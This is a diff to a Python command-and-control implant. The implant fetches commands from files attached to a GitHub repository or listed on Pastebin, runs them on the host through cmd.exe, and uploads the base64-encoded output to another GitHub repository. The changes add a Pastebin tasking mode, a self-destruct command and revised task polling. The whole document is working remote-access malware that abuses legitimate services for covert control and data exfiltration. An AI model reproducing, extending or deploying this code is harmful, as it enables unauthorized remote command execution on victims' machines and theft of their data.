@@ -55,7 +55,6 @@ def scrapeRepoID(html_response):
 def getGithubRepoID(repo_url):
     host = 'github.com'
     path = "/" + repo_url.split('/')[-2] + "/" + repo_url.split('/')[-1]
-    print(path)
     html_response = fetchRepoHtml(host, path)
     repo_json_data = scrapeRepoID(html_response)
     if repo_json_data:
@@ -247,7 +246,7 @@ def getUploadLink(request_1_response):
     body_bytes = body.encode('utf-8')
     headers['Content-Length'] = str(len(body_bytes))
 
-    print(f"/upload/repository-files/{request_1_response['asset']['id']}")
+    # print(f"/upload/repository-files/{request_1_response['asset']['id']}")
     # Send the request
     connection.request("PUT", f"/upload/repository-files/{request_1_response['asset']['id']}", body=body_bytes, headers=headers)
     response = connection.getresponse()
@@ -259,6 +258,7 @@ def uploadResultToC2(command_result, repo_id):
     status_1, response_1 = uploadFileContent(response, command_result)
     status_2, response_2 = getUploadLink(response)
     print(f"[+] Result Link: {response_2['href']}")
+    return response_2['id']
 
 
 def getCommandFromGithubC2(request_response_2, max_redirects=5):
@@ -291,19 +291,46 @@ def getCommandFromGithubC2(request_response_2, max_redirects=5):
 
     return '', '' 
 
-def getTasksLink():
+def getTasksIds():
     connection = http.client.HTTPSConnection("pastebin.com")
     connection.request("GET", '/' + PASTE_BIN.split('/')[-2] + '/' + PASTE_BIN.split('/')[-1])
     response = connection.getresponse()
     return response.read().decode().split('\r\n')
 
-def main():
+def usePasteBin():
+    # Not interactive
+    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
+    tasks_ids = getTasksIds()
+
+    for task_id in tasks_ids:
+        url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/test-hassoun.zip"}
+        status_code, command = getCommandFromGithubC2(url)
+        
+        # Kill Yourself
+        if command == 'destruct':
+            exit(1)
+        
+        else:
+            # We have a valid command
+            print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
+            command_result = subprocess.run(["cmd.exe", "/c", command], text=True, capture_output=True)
+            print(f"[*] Execute The Command: {command}")
+            uploadResultToC2(str(base64.b64encode(str.encode(command_result.stdout))), repo_id_result)
+            print(f"[+=>] Result Of The Command Uploaded")
+        
+
+
+def useGithub():
     # tasks_links = getTasksLink()
-    repo_id = getGithubRepoID(C2_RESULT_REPO)
-    task_id = 15093980
-    
+
+    repo_id_result = getGithubRepoID(C2_RESULT_REPO)
+    repo_id_c2server = getGithubRepoID(C2_GITHUB_REPO)
+    task_id = 15098867
+
     while True:
-        for i in range(200):
+        print("[*] Expecting the next task id")
+        expected_task_id = uploadResultToC2('starting', repo_id_c2server)
+        while task_id < expected_task_id - 1:
             task_id += 1
 
             url = {"href": C2_GITHUB_REPO + f"/files/{task_id}/test-hassoun.zip"}
@@ -322,11 +349,12 @@ def main():
                 print(f"<=+] Command retrieved From GitHub C2 Server: {command}")
                 command_result = subprocess.run(["cmd.exe", "/c", command], text=True, capture_output=True)
                 print(f"[*] Execute The Command: {command}")
-                uploadResultToC2(str(base64.b64encode(str.encode(command_result.stdout))), repo_id)
+                uploadResultToC2(str(base64.b64encode(str.encode(command_result.stdout))), repo_id_result)
                 print(f"[+=>] Result Of The Command Uploaded")
-        sleep(120)
-        
+            task_id = expected_task_id
+        sleep(60)        
 
 if __name__ == '__main__':
-    main()
+    useGithub()
+    # usePasteBin()
 
